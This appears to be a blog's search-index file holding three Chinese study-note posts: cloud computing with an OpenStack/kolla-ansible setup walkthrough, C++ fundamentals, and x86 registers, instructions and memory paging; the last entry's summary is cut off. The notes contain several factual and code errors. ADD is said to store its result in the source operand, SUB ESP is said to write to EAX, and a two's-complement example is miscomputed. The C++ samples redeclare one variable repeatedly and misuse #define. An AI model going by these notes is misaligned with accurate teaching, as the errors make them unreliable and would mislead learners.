[{"content":"云服务平台：微软的Azure，开源云服务平台Open Stack，谷歌家的Google Cloud，亚马逊的AWS，国内的阿里云，京东云，华为云，腾讯云等等公有云，私有云\n云计算就是通过互联网按需访问计算资源，例如物理服务器和虚拟服务器资源，数据存储器等等，这些资源都由云服务提供商管理，云服务提供商通过这些资源，并且根据使用情况按量收费\n云计算的特点：按需使用，按量收费，弹性资源，自助服务（即开即用，无需审核），无人值守（高可用，无需监守）\n亚马逊在2006年推出S3和EC2，2008年谷歌发布Google App Engine，2009年heroku发布Paas，2010年微软推出Azure服务平台，2011年Open Stack发布开源Iaas，2014年亚马逊推出lambda（无服务器计算服务）\n云计算类似于水电服务，电力部门已经为你架构好了基础设施，无需再投资建设基础设施\n云计算按需支付按需使用，无需再使用服务器来浪费用不到的资源，多用资源，使用时间长更省钱\n云计算保证业务高可用，运维自动化，资源自动扩缩，无需人为管理\n云主机，云服务器，云端服务器\n创建云主机，指定规格\n核心数量，内存，磁盘，网络（私有地址，公有地址），操作系统，操作系统账户（密码，ssh密钥），地理位置，防火墙（安全组）\nopenstack 构建私有云或者公有云\n安装openstack\nOpenStack 是一个基于Python的开源项目，安装太复杂了，将通过kolla-ansible快速部署OpenStack环境\nkolla-ansible使用ansible自动化运维工具进行OpenStack服务编排部署，kolla-ansible采用可全容器部署，全部跑在docker容器中\nOpenStack官方要求8g内存，40g磁盘\nKolla Ansible支持Ubuntu20.04，Ubuntu22.04，Debian 11系统，支持Ubuntu，centos，Debian容器\nKolla Ansible官方文档地址：https://docs.openstack.org/kolla-ansible/yoga/user/quickstart.html\n这里将使用Ubuntu22.04\n安装必要依赖\nsudo apt install git python3-dev libffi-dev gcc libssl-dev\nsudo apt install python3-pip\npypi换源（适合国内朋友）\npip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple\n安装 ansible（官方要求ansible版本大于4，小于6）\nsudo apt install ansible\n或者\nsudo pip install -U \u0026lsquo;ansible\u0026gt;=4,\u0026lt;6\u0026rsquo;\n安装Kolla-ansible\nsudo pip install git+https://opendev.org/openstack/kolla-ansible@master\n创建目录\nsudo mkdir -p /etc/kolla\n复制kolla-ansible配置文件（例如globals.yml和passwords.yml，清单文件）\ncp -r /usr/local/share/kolla-ansible/etc_examples/kolla/* /etc/kolla\ncp /usr/local/share/kolla-ansible/ansible/inventory/* .\n安装kolla-ansible依赖\nkolla-ansible install-deps\n我这里提升ansible-core版本太低，需要在2.14.0和2.15.0之间，可以执行pip install ansible-core==2.14.0命令解决\n修改ansible配置文件\nnano /etc/ansible/ansible.cfg\n[defaults] host_key_checking=False pipelining=True forks=100\n在/usr/local/share/kolla-ansible/ansible/inventory/目录下\n修改配置文件，有两个文件，分别为all-in-one和multinode\nall-in-one文件就是单机配置，multinode是多节点配置，我这里只有本地单机，因此使用all-in-one文件\n修改hosts\nsudo vim /etc/hosts\n10.10.1.10 server0\n测试配置是否正确\nansible -i all-in-one all -m ping\n部署机器的密码存储在/etc/kolla/passwords.yml\nkolla-genpwd\n配置globals.yml文件（文件在/etc/kolla目录下）\nkolla_base_distro: \u0026quot;ubuntu\u0026quot; network_interface: \u0026quot;eth0\u0026quot;\rneutron_external_interface: \u0026quot;eth1\u0026quot;\rkolla_internal_vip_address: \u0026quot;10.10.1.10\u0026quot;\renable_cinder: \u0026quot;yes\u0026quot;\r上面的配置内容分别为容器的镜像，网络接口，,第二网络接口（用来访问外部网络，不需要ip），指定eth0接口的ip地址，是否使用cinder工具包（提供了多种功能）\n有可能你的接口不叫eth0，可以查询一下接口名称\napt install net-tools\nifconfig -a\nnano /usr/local/share/kolla-ansible/ansible/kolla-host.yml\nhosts: server01\n测试globals.yml文件是否配置正确（在/usr/local/share/kolla-ansible/ansible/inventory/目录下）\nkolla-ansible -i ./all-in-one bootstrap-servers\n部署前检查\nkolla-ansible -i ./all-in-one prechecks -vvvv\n开始部署\nkolla-ansible -i ./all-in-one deploy -vvvv\n安装 OpenStack CLI 客户端\npip install python-openstackclient -c https://releases.openstack.org/constraints/upper/yoga\nkolla-ansible post-deploy\n/usr/local/share/kolla-ansible/init-runonce\nopenstack server list\nopenstack server create \u0026ndash;help |less 查看该命令的帮助信息\nopenstack server create \u0026ndash;flavor 规格id \u0026ndash;image 镜像id \u0026ndash;network 网络id \u0026ndash;security-group 安全组id \u0026ndash;key-name 密钥name test-server\nopenstack flavor list | grep 4096 查看可用的规格\nopenstack image list 查看可用的镜像\nopenstack network list 查看可用网络\nopenstack security group list 查看可用的安全组\nopenstack keypair list 查看可用的密钥\nopenstack floating ip list 查看绑定的IP\nopenstack server add floating ip 主机id或者主机名字 ip 给主机绑定公网地址\n安全组\n为一组相同特性的云主机提供安全访问规则保护\n安全组规定了网络流入规则和流出规则，例如开放22端口和80端口\n安全组作用于云主机的网卡，可以对云主机的单一网卡设置安全组，使用白名单规则\n定义安全组规则\n源地址（限制流入IP，例如只允许单一IP访问该云主机）\n目的地址（限制流出IP，例如只允许云主机访问单一资源）\n协议类型和协议端口（允许哪个协议的类型和哪个协议端口）\n行为（Allow/Deny）\n优先级（避免一些安全组规则被覆盖）\n默认安全组（拒绝全部访问）\n安全组规则应最小授权\n自动化部署工具\nansible，terraform，chef，puppet，saltstack\nAWS CloudFormatio\nGoogle Cloud Deployment Manager\nAzure Resource Manager\nOpenstack Heat\n阿里云资源编排服务\n镜像服务\n镜像：云主机的操作系统\n私有镜像，公共镜像\n镜像生命周期管理（公共是云服务平台管理，私有是自己进行管理），安全加固（确保镜像安全）\n第三方镜像（包含特定的软件，集成定制化镜像）\n网络服务\n虚拟网络，虚拟子网，虚拟端口。虚拟路由\n网络隔离（通过创建虚拟网络），网络互通（不同虚拟网络之间互通）\n安全（安全组，防火墙（防范网络攻击，例如DDOS攻击），VPN（服务之间私密互通，通信不被监听））\n云服务平台有没有提供网络监听，网络抓包\n云存储服务\n块存储（例如系统盘，磁盘，快照），文件存储（不同主机之间共享访问资源），对象存储（管理数据文件，抽象类文件资源，可以存储各种类别的文件，数据池）\n云存储容量可大可小，性能可高可低，例如HDD，SSD硬盘类型\n细粒度的访问策略（为每个数据提供自己的访问策略，例如一个文件，用户A可以修改数据，而另一个用户只能读取数据，当全部数据的存储在一起时，方便管理和安全）\n存储访问模式（对数据的访问量来区分，例如经常访问的数据和不经常访问的数据但是又很重要的）\n跨区域复制（为了高可用，可用同步到其他数据中心）\n云数据库服务\n支持不同数据库类型以及不同版本\n支持不同规格，存储性能\n数据库分析和调优\n自动加密（数据本地存储加密）\n容灾备份，多区域同步（自动切换）\nUI集成\n迁移工具（内部数据迁移到外部云数据库上）\n常见的云数据库服务\nOpenStack Trove\nGoogle Cloud SQL\nMicrosoft Azure SQL Database\n高级数据库服务\n开箱即用\n天然支持跨区域（自动网络优化，自动灾备）\n数据一致性策略\nNoSQL\n事件监听和处理\n针对Mobile app，Serverless，IoT\nAWS DynamoDB\nAzure Cosmos DB\nGoogle Cloud Firestore\n资源编排服务ROS（Resource Orchestration Service）\n提供模板文件对应用进行生命周期管理，维护资源依赖关系，检测资源状态，异常自动修复\n基础设施即代码（Dev Ops）\n可标准化，重复性，批量进行部署，确保部署的效率\n快速交付应用\nMicrosoft Azure Resource Manager\n服务托管\n应用为中心，无需关心底层设施的管理，集成周边云服务，只需要管理应用发布和运维\n支持不同编程语言运行时环境\nGitOps\n支持不同部署模式（蓝绿部署（持续部署模式，有两套系统，一个是正在提供服务的，另一个准备发布的系统，这两个系统都是功能相同的，只是系统版本以及对外的服务不同，不对外提供服务的系统可以用于测试环境，到达标准后可切换另一套系统，出现问题可及时切换回），金丝雀部署（只有一套环境，在新旧版本之间进行操作，有新版本时，只对一部分服务进行升级，降低危害和提升恢复能力，即尝鲜，内部测试，外部测试等等））\n降低运维成本（无需管理底层资源，自动伸缩，负载均衡）\nKubernetes部署工具\nhelm\nkustomize\nOperator\nkompose\nServerless 无服务器应用框架\nCNCF基金会（Cloud Native Computing Foundation，云原生计算基金会)\ncode based，container based\n支持混合云\n驱动函数触发\n需要监控，调试函数，监控API，UI\n安全（厂商如何放心运行用户提供的函数，虚拟机隔离，容器隔离，沙盒）\nKnative开源项目（基于K8S集群，Google背书，非CNCF官方项目）\n支持事件源（Knative Eventing），事件源与服务隔离，支持应用弹性扩缩，支持应用多版本，流量分发策略\nKEDA（Kubernetes Event-driven Autoscaling）开源项目（微软背书，CNCF项目）\n支持事件驱动，支持不同的事件源，支持应用弹性扩缩，支持不同类型的应用（Deployment/Job）,应用感知事件源（支持不同SDK）\nFission开源项目\n面向code（支持python，nodejs，go，c++，php，bash）\n支持容器\n冷启动优化（函数第一次被调用）\n可以和Keda集成\nGithub + ArgoCD自动化部署\nPrometheus 部署和监控\n","permalink":"https://99999.fun/posts/164/","summary":"云服务平台：微软的Azure，开源云服务平台Open Stack，谷歌家的Google Cloud，亚马逊的AWS，国内的阿里云，京东云，华为云，腾讯云等等公有云，私有云\n云计算就是通过互联网按需访问计算资源，例如物理服务器和虚拟服务器资源，数据存储器等等，这些资源都由云服务提供商管理，云服务提供商通过这些资源，并且根据使用情况按量收费\n云计算的特点：按需使用，按量收费，弹性资源，自助服务（即开即用，无需审核），无人值守（高可用，无需监守）\n亚马逊在2006年推出S3和EC2，2008年谷歌发布Google App Engine，2009年heroku发布Paas，2010年微软推出Azure服务平台，2011年Open Stack发布开源Iaas，2014年亚马逊推出lambda（无服务器计算服务）\n云计算类似于水电服务，电力部门已经为你架构好了基础设施，无需再投资建设基础设施\n云计算按需支付按需使用，无需再使用服务器来浪费用不到的资源，多用资源，使用时间长更省钱\n云计算保证业务高可用，运维自动化，资源自动扩缩，无需人为管理\n云主机，云服务器，云端服务器\n创建云主机，指定规格\n核心数量，内存，磁盘，网络（私有地址，公有地址），操作系统，操作系统账户（密码，ssh密钥），地理位置，防火墙（安全组）\nopenstack 构建私有云或者公有云\n安装openstack\nOpenStack 是一个基于Python的开源项目，安装太复杂了，将通过kolla-ansible快速部署OpenStack环境\nkolla-ansible使用ansible自动化运维工具进行OpenStack服务编排部署，kolla-ansible采用可全容器部署，全部跑在docker容器中\nOpenStack官方要求8g内存，40g磁盘\nKolla Ansible支持Ubuntu20.04，Ubuntu22.04，Debian 11系统，支持Ubuntu，centos，Debian容器\nKolla Ansible官方文档地址：https://docs.openstack.org/kolla-ansible/yoga/user/quickstart.html\n这里将使用Ubuntu22.04\n安装必要依赖\nsudo apt install git python3-dev libffi-dev gcc libssl-dev\nsudo apt install python3-pip\npypi换源（适合国内朋友）\npip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple\n安装 ansible（官方要求ansible版本大于4，小于6）\nsudo apt install ansible\n或者\nsudo pip install -U \u0026lsquo;ansible\u0026gt;=4,\u0026lt;6\u0026rsquo;\n安装Kolla-ansible\nsudo pip install git+https://opendev.org/openstack/kolla-ansible@master\n创建目录\nsudo mkdir -p /etc/kolla\n复制kolla-ansible配置文件（例如globals.yml和passwords.yml，清单文件）","title":"云计算学习笔记"},{"content":"C++的历史最早追溯到1979年，Bjarne Stroustrup创建了带类的C（即C的超集），这就是C++的雏形，直到1983年，才正式成为C++\nC++标准委员会在1998年发布了第一个国际标准C++ ISO/IEC 1488，又叫C++ 98\n2011年，C++ 11标准发布，boost库诞生，11标准之后，c++每3年发布一个版本，每一个版本保持向后兼任性的同时，还提供新功能以及改进\nC++的特点：封装能力强，高性能，低功耗（可在微型设备上运行，例如嵌入式设备）\nC++主要用于开发桌面应用程序，后台系统引擎，游戏以及游戏引擎，图像视觉和AI引擎，数据库（例如MongoDB）,嵌入式开发\nC++是编译型语言，C++程序会经过编译器生成中间的目标程序，再通过链接器，将目标程序和程序库链接到一起，最后生成可执行程序\n.cpp程序经过编译器生成汇编程序.asm，再通过汇编器生成目标程序.obj，链接器会将目标程序和其他目标程序以及一些库程序链接到一起，生成可执行文件\nWindows下直接安装Visual Studio，选择使用C++的桌面开发和通用Windows平台开发，Visual Studio扩展插件选上\n如果需要开发移动设备的开发，也可以选择使用C++的移动开发选项，还有使用C++的Linux开发，根据自己需求选择\n第一个C++程序\n#include＜iostream＞\rint main()\r{\rstd::cout \u0026lt;\u0026lt; \u0026quot;hallo word!\\n\u0026quot;;\r}\r运行以及调试程序：生成，生成解决方案，清理解决方案，编译\nC++的每一个变量是具备其数据类型的，该数据类型决定了该变量在内存的空间大小以及该内存空间的值范围，该变量能参与哪些运算，例如：\nint sum; // 定义整形\rint a = 1;\rint b = 1;\rsum = a + b; // 求和\r一些常见的类型的定义：\n#include \u0026quot;stdafx.h\u0026quot;\rvoid main(void)\r{\rchar a[6]=\u0026quot;qq\u0026quot;;\rshort int a = 88;\rlong int a = 99;\rint a = 99;\rfloat a = 3.14f;\rdouble a = 3.14;\rlong double a = 3.14;\rwchar_t a[] = L'a';\rbool a = true;\r}\r调试后是可以监视变量的值，以及内存分布情况\n内存中显示cc表示该内存没有初始化（没有赋值）\nC++中的标识符使用大小写字母，下划线开始，后面跟着大小写字母，下划线，数字组成\nC++的标识符是大小写敏感的，不能使用C++关键字，不能数字开头，不能出现标点符号，长度不超过32位，标识符用于标识变量，函数，类，以及模块等等\n变量和常量\n变量：在运行过程中，该值可以被改变的\nint a = 1 , b = 2;\r常量：在运行过程中，该值是不能被改变的\n#define a = 1;\rconst int b = 2;\r注意：#define是不出现在编译过程中的，如果在编译期发生错误，是很难排查的\n常量整数，默认是十进制，0X表示十六进制，0表示八进制\nU和L分别表示无符合整数（unsigned）和长整数（long），U和L可以大小写，例如：022U\n布尔常量，true和false\n字符常量是使用单引号的，如果使用L开头表示为宽字符常量（存储在wchar_t类型中），否则为窄字符常量（存储在char类型中）\n单行注释和多行注释\n// 单行注释\r/*\r多行注释\rxxx\r*/\r运算符和表达式\n算术，关系，逻辑，位，赋值等等\n算术运算符：+，-，*，/，%，++，\u0026ndash;，例如：\nint a = 1;\rint b = 2;\rcout \u0026lt;\u0026lt; a+b \u0026lt;\u0026lt; endl;\r关系运算符：==，!=，\u0026gt;，\u0026lt;，\u0026lt;=，\u0026gt;=，例如：\ncout \u0026lt;\u0026lt; (a==b) \u0026lt;\u0026lt; endl; // 0\rcout \u0026lt;\u0026lt; (a!=b) \u0026lt;\u0026lt; endl; // 1\r逻辑运算符：\u0026amp;\u0026amp;，||，!，例如：\ncout \u0026lt;\u0026lt; (a==true||b==true) \u0026lt;\u0026lt; endl;\r与或非\n赋值运算符：=，+=，-=，*=，/=，%=，\u0026laquo;=，\u0026raquo;=，\u0026amp;=，^=，|=，例如：\nint c += a\rcout \u0026lt;\u0026lt; c \u0026lt;\u0026lt; endl;\r位运算符：\u0026amp;，|，^，~\n与，或，异或，取反，为双目运算符，优先级高于逻辑，低于比较\ncout \u0026lt;\u0026lt; (a|b) \u0026lt;\u0026lt; endl; // 0001 \u0026amp; 0010 = 0011 ==\u0026gt;3\r移位：\u0026laquo;，\u0026raquo;\n左移，右移\ncout \u0026lt;\u0026lt; (a\u0026lt;\u0026lt;2) \u0026lt;\u0026lt; endl; // 00001 \u0026gt;\u0026gt; 2 = 00100 ==\u0026gt;4\r其他运算符：sizeof，a\u0026gt;b ? a:b，,，.，-\u0026gt;，Cast，\u0026amp;，*\nsizeof返回变量的大小，例如:\ncout \u0026lt;\u0026lt; (：sizeof(a)) \u0026lt;\u0026lt; endl; // 1\ra\u0026gt;b ? a:b，假如a\u0026gt;b为真，则为a，否则为b\nint d = a\u0026gt;b ? a : b;\r,逗号运算符，顺序执行运算，最后的值为逗号列表的最后一个表达式的值，例如：\nint e = (a,b,c,d);\r.点和-\u0026gt;箭头，用来引用类，结构，共同体成员\nCast强制转换，将一个数据类型转换为另一个数据类型，例如：\nfloat f = float(a);\r\u0026amp;指针运算符，返回变量的实际地址，例如：\ncout \u0026lt;\u0026lt; \u0026amp;f \u0026lt;\u0026lt; endl;\r*指针运算符，指向变量，例如：\nfloat *aa = \u0026amp;f;\rcout \u0026lt;\u0026lt; \u0026amp;aa\u0026lt;\u0026lt; endl;\r补码知识小课堂\n在一个二进制的最高为存放0或者1来表示正数，负数\n补码法：保留符合位，后面每位取反+1，例如：1111，保留最高位的1，然后取反，得到1000，然后加1，得到10001，表示了负数-1\n函数B2T补码（Binary to Two s-complement），还有一个B2W\n字节序（Byte Ordering），byte存放的顺序\n大端法和小端法（Big Endian（顺序排序），Little Endian（倒序排序），英特尔采用）\n例如：int a = 2147483648; // 在英特尔机器上面，内存表示为00000080，因为使用了小端法Little Endian，如果是大端法将表示为80000000\n","permalink":"https://99999.fun/posts/163/","summary":"C++的历史最早追溯到1979年，Bjarne Stroustrup创建了带类的C（即C的超集），这就是C++的雏形，直到1983年，才正式成为C++\nC++标准委员会在1998年发布了第一个国际标准C++ ISO/IEC 1488，又叫C++ 98\n2011年，C++ 11标准发布，boost库诞生，11标准之后，c++每3年发布一个版本，每一个版本保持向后兼任性的同时，还提供新功能以及改进\nC++的特点：封装能力强，高性能，低功耗（可在微型设备上运行，例如嵌入式设备）\nC++主要用于开发桌面应用程序，后台系统引擎，游戏以及游戏引擎，图像视觉和AI引擎，数据库（例如MongoDB）,嵌入式开发\nC++是编译型语言，C++程序会经过编译器生成中间的目标程序，再通过链接器，将目标程序和程序库链接到一起，最后生成可执行程序\n.cpp程序经过编译器生成汇编程序.asm，再通过汇编器生成目标程序.obj，链接器会将目标程序和其他目标程序以及一些库程序链接到一起，生成可执行文件\nWindows下直接安装Visual Studio，选择使用C++的桌面开发和通用Windows平台开发，Visual Studio扩展插件选上\n如果需要开发移动设备的开发，也可以选择使用C++的移动开发选项，还有使用C++的Linux开发，根据自己需求选择\n第一个C++程序\n#include＜iostream＞\rint main()\r{\rstd::cout \u0026lt;\u0026lt; \u0026quot;hallo word!\\n\u0026quot;;\r}\r运行以及调试程序：生成，生成解决方案，清理解决方案，编译\nC++的每一个变量是具备其数据类型的，该数据类型决定了该变量在内存的空间大小以及该内存空间的值范围，该变量能参与哪些运算，例如：\nint sum; // 定义整形\rint a = 1;\rint b = 1;\rsum = a + b; // 求和\r一些常见的类型的定义：\n#include \u0026quot;stdafx.h\u0026quot;\rvoid main(void)\r{\rchar a[6]=\u0026quot;qq\u0026quot;;\rshort int a = 88;\rlong int a = 99;\rint a = 99;\rfloat a = 3.","title":"C++学习笔记"},{"content":"x86架构通用寄存器（32位的x86架构和64位的x86_64架构）\nx86_64架构由amd公司推出，因此又叫amd64架构，64位架构是基于32位架构扩展的\n32位架构的x86处理器具备8个32位的通用寄存器，可通过名称来引用这8个寄存器，分别为EAX，ECX，EDX，EBX，ESP，EBP，ESI，EDI\nEAX的低16位可以被单独使用，引用名称叫AX（高位是左边位，低位是右边位），AX又可以被分为高8位的AH和低8位的AL\n实质上EAX，ECX，EDX，EBX都可以被拆开使用，ECX的低16位叫CX，CX又可以被分为高8位的CH和低8位的CL\nEDC的低16位叫DX，DX又可以被分为高8位的DH和低8位的DL，EBX的低16为叫BX，BX又可以被分为高8位的BH和低8位的BL\nESP，EBP，ESI，EDI的低16位也可以被单独使用，但是没有8位的，这低16位名称分别是SP，BP，SI，DI\nEAX寄存器被乘法和除法指令自动调用，因此又叫累加寄存器\nECX被LOOP（循环）指令调用为循环计数器\nESP被用于寻址栈上的数据，ESP始终指向栈顶，因此又叫栈指针寄存器\nESI和EDI又叫变址寄存器，变址寄存器引用的是内存地址，ESI指向内存源地址，EDI指向目的地址\nEBP叫帧指针寄存器，被用来引用栈上的函数参数和局部变量\n除了通用寄存器还有EFLAGS标志寄存器，EIP指针寄存器（这个非常重要，因为其引用的是下一条要被指向的指令的地址，注意：并不能直接通过名称来说调用，只能通过CALL之类的间接修改）等等\n64位架构（通用寄存器为16个，并且是64位的，而且每个都可以低8位，16位，32位单独使用）\nEAX，ECX，EDX，EBX，ESP，EBP，ESI，EDI的64位是R开头的，其他和32位架构是一样的，64位架构的内存地址也是64位的\nx86汇编指令（通常是由一个操作码（opcode）和0到多个的操作数（operand）组成）\n整数加减指令（ADD指令（有2个操作数，分别是目的操作数和源操作数，ADD指向将这2个操作数的值相加，将结果存放在源操作数中，源操作数可以是寄存器，内存，目的操作数要满足可写条件，因此也可以是寄存器，内存，但是不能同为内存））和SUB指令（和ADD指令一样，但是是将结果存放在目的操作数中））\nADD指令：ADD EAX,32 （将EAX寄存器的值加上32，并且将结果存放回EAX寄存器中）\nSUB指令：SUB ESP,32 （将ESP寄存器的值减去32，并且将值存放回EAX寄存器中）\n数据传输指令（x86架构有多个数据传输指令，这里是MOV指令）\nMOV指令用于寄存器之间和寄存器和内存之间传输数据使用，MOV指令将源操作数复制到目的操作数中，例如MOV EDX, 666 （将数值666存储在EDX寄存器中）\nx86架构内存寻址：displacement（位移，可以在指令中直接得到内存的偏移量，也就是位移，这个位移表示距离操作数的直接偏移量），base（基址，内存地址存储在通用寄存器中），index（索引，注意ESP寄存器不能用于索引），scale（比例因子，用于索引相乘，是固定值，可取值1，2，4，8）\n内存最复杂的地址计算公式：base+（index*scale）+displacement\nbase和index，displacement都可以随意组合，也可以不存在，如果不使用index，就不需要使用scale了，scale只为index服务，index和scale被用于寻找数组地址和多维数组\n入栈和出栈指令（PUSH和POP指令）\nPUSH指令只有一个操作数，就是需要入栈的源操作数，这个指令可以将ESP寄存器向下移动一个位，并且将源操作数复制到ESP寄存器指向的内存处，例如：PUSH EAX\nPOP指令也是只有一个操作数，就是用来接收数据的目的操作数，POP指向会将ESP寄存器指向的内存处的值复制到目的操作数中，并且将ESP寄存器向上移动一个位置，例如：POP EAX\n分支跳转指令（JMP指令）\nJMP指令只有一个操作数，这个操作数可以是内存，寄存器或者立即数，通过这个操作数来给出需要跳转的目的地址，例如 JMP EAX\n过程调用指令（CALL指令）\n高级语言的函数在汇编叫过程，CALL指令只有一个操作数，是过程的起始地址，例如 CALL EAX\n分支跳转指令和过程调用指令的区别是，分支跳转指令不会记录返回地址，这个返回地址是CALL指令之后的下一条指令的地址，CALL指令会将返回地址入栈，然后跳转到目的地址执行\n子过程执行完成通过RET指令返回，RET指令会在栈上弹出返回地址，并且跳转到该返回地址上继续执行\n内存分页机制\n线性地址\n在内存分页模式中，应用使用的地址就叫线性地址，由MMU(menorymanagement unit)基于页表来映射转换为物理地址\n在内存分页模式未出现之前，应用是直接访问物理内存的，应用具备读写全部物理内存的权限，因此可能会覆盖其他应用的数据，而80386架构出现，出现了保护模式，使用内存分页来通过特权级和进程地址空间来进行隔离\n进程地址空间隔离是通过进程独立性页表来完成的，每个进程实现的地址空间是不同的，避免影响到其他进程\n80386两级页表\n80386架构的线性地址为32位，因此可寻4GB大小的内存空间（4096），地址总线也是32位，因此也是只能寻找4gb大小的物理内存，而且分页机制也将每个物理内存的页面的大小设为4096字节\n一个页面大小为4096字节，地址总线为32位，因此一个页面可存储1024个物理页面地址，80386页表的第一页面是目录页面，物理内存地址存储在CR3寄存器中，可通过该目录页面来查找第二页面的1024个物理页面地址\nMMU将32位的线性地址，低12位是页内偏移，然后的低10位是页表的索引，最后的高10位是页面目录索引，页内偏移的取值范围为0到4095，页表索引和页面目录索引的取值范围为0到1023\n80386线性地址转换到物理地址的过程：先从CR3寄存器中获取页目录的物理地址，然后选择一个页表，在到页表索引中，找到页面的物理地址，最后通过页内偏移量来得到实质上的物理地址\nPAE三级页表\n80386架构的每个进程可使用4gb的线性地址空间，但是操作系统会将4gb的地址空间划分成用户空间和内核空间，为了解决内存空间不够使用，英特尔公司推出了物理地址扩展技术（PAE，PhysicalAddressExtension）\nPAE将地址总线扩展到36位，因此可寻找64gb的物理内存，但是线性地址依然是32位的，为了解决32位线性地址支持36位的物理地址映射，MMU页表映射机制进行了调整，一个页面只能存储512个地址\nPAE的32位线性地址是，高2位是页目录指针索引，后面9位是页目录索引，再后9位是页表索引，最后12位是页内偏移\nx64四级页表\n因为PAE技术并没有扩展线性空间，32位的地址宽度不够使用了，AMD公司基于x86架构扩展而出的x64架构，x64架构的寄存器宽度是64位的，但是线性地址只使用了48位，但是也足够了，因为可以寻高达256TB的内存空间地址，具体可寻多少物理内存空间，取决于地址总线的宽度\nx64架构，在PAE的基础上扩展了页表为4级，而且每个页面的大小是4096字节，高9位是页目录指针表，后9位是页目录指针，再后9位是页目录，然后9位是页表。最后12位是页内偏移量\n虚拟内存\n进程是以内存页面为单位向操作系统申请内存的，现代操作系统中会对申请的内存空间进行记录，并不会马上分配，而是等到该进程真正访问该内存空间是才会分配物理页面并且进行映射，然后恢复中断程序，如果进程访问了没有映射的内存空间，会被操作系统进行page fault处理，操作系统通过page failt handle进行检查内存空间分配记录\n物理空间不够分配时，操作系统可以将少使用的物理页面写入到磁盘交换分区（Swap分区）中，将空出来的页面给需要的进程使用，注意：当在磁盘交换分区中内存页面被访问了，也会触发page fault处理，操作系统通过page failt handle来将磁盘交换分区的内存页面加载回内存中\n虚拟内存并不是万金油，触发虚拟内存的条件是物理空间不够分配时\n","permalink":"https://99999.fun/posts/162/","summary":"x86架构通用寄存器（32位的x86架构和64位的x86_64架构）\nx86_64架构由amd公司推出，因此又叫amd64架构，64位架构是基于32位架构扩展的\n32位架构的x86处理器具备8个32位的通用寄存器，可通过名称来引用这8个寄存器，分别为EAX，ECX，EDX，EBX，ESP，EBP，ESI，EDI\nEAX的低16位可以被单独使用，引用名称叫AX（高位是左边位，低位是右边位），AX又可以被分为高8位的AH和低8位的AL\n实质上EAX，ECX，EDX，EBX都可以被拆开使用，ECX的低16位叫CX，CX又可以被分为高8位的CH和低8位的CL\nEDC的低16位叫DX，DX又可以被分为高8位的DH和低8位的DL，EBX的低16为叫BX，BX又可以被分为高8位的BH和低8位的BL\nESP，EBP，ESI，EDI的低16位也可以被单独使用，但是没有8位的，这低16位名称分别是SP，BP，SI，DI\nEAX寄存器被乘法和除法指令自动调用，因此又叫累加寄存器\nECX被LOOP（循环）指令调用为循环计数器\nESP被用于寻址栈上的数据，ESP始终指向栈顶，因此又叫栈指针寄存器\nESI和EDI又叫变址寄存器，变址寄存器引用的是内存地址，ESI指向内存源地址，EDI指向目的地址\nEBP叫帧指针寄存器，被用来引用栈上的函数参数和局部变量\n除了通用寄存器还有EFLAGS标志寄存器，EIP指针寄存器（这个非常重要，因为其引用的是下一条要被指向的指令的地址，注意：并不能直接通过名称来说调用，只能通过CALL之类的间接修改）等等\n64位架构（通用寄存器为16个，并且是64位的，而且每个都可以低8位，16位，32位单独使用）\nEAX，ECX，EDX，EBX，ESP，EBP，ESI，EDI的64位是R开头的，其他和32位架构是一样的，64位架构的内存地址也是64位的\nx86汇编指令（通常是由一个操作码（opcode）和0到多个的操作数（operand）组成）\n整数加减指令（ADD指令（有2个操作数，分别是目的操作数和源操作数，ADD指向将这2个操作数的值相加，将结果存放在源操作数中，源操作数可以是寄存器，内存，目的操作数要满足可写条件，因此也可以是寄存器，内存，但是不能同为内存））和SUB指令（和ADD指令一样，但是是将结果存放在目的操作数中））\nADD指令：ADD EAX,32 （将EAX寄存器的值加上32，并且将结果存放回EAX寄存器中）\nSUB指令：SUB ESP,32 （将ESP寄存器的值减去32，并且将值存放回EAX寄存器中）\n数据传输指令（x86架构有多个数据传输指令，这里是MOV指令）\nMOV指令用于寄存器之间和寄存器和内存之间传输数据使用，MOV指令将源操作数复制到目的操作数中，例如MOV EDX, 666 （将数值666存储在EDX寄存器中）\nx86架构内存寻址：displacement（位移，可以在指令中直接得到内存的偏移量，也就是位移，这个位移表示距离操作数的直接偏移量），base（基址，内存地址存储在通用寄存器中），index（索引，注意ESP寄存器不能用于索引），scale（比例因子，用于索引相乘，是固定值，可取值1，2，4，8）\n内存最复杂的地址计算公式：base+（index*scale）+displacement\nbase和index，displacement都可以随意组合，也可以不存在，如果不使用index，就不需要使用scale了，scale只为index服务，index和scale被用于寻找数组地址和多维数组\n入栈和出栈指令（PUSH和POP指令）\nPUSH指令只有一个操作数，就是需要入栈的源操作数，这个指令可以将ESP寄存器向下移动一个位，并且将源操作数复制到ESP寄存器指向的内存处，例如：PUSH EAX\nPOP指令也是只有一个操作数，就是用来接收数据的目的操作数，POP指向会将ESP寄存器指向的内存处的值复制到目的操作数中，并且将ESP寄存器向上移动一个位置，例如：POP EAX\n分支跳转指令（JMP指令）\nJMP指令只有一个操作数，这个操作数可以是内存，寄存器或者立即数，通过这个操作数来给出需要跳转的目的地址，例如 JMP EAX\n过程调用指令（CALL指令）\n高级语言的函数在汇编叫过程，CALL指令只有一个操作数，是过程的起始地址，例如 CALL EAX\n分支跳转指令和过程调用指令的区别是，分支跳转指令不会记录返回地址，这个返回地址是CALL指令之后的下一条指令的地址，CALL指令会将返回地址入栈，然后跳转到目的地址执行\n子过程执行完成通过RET指令返回，RET指令会在栈上弹出返回地址，并且跳转到该返回地址上继续执行\n内存分页机制\n线性地址\n在内存分页模式中，应用使用的地址就叫线性地址，由MMU(menorymanagement 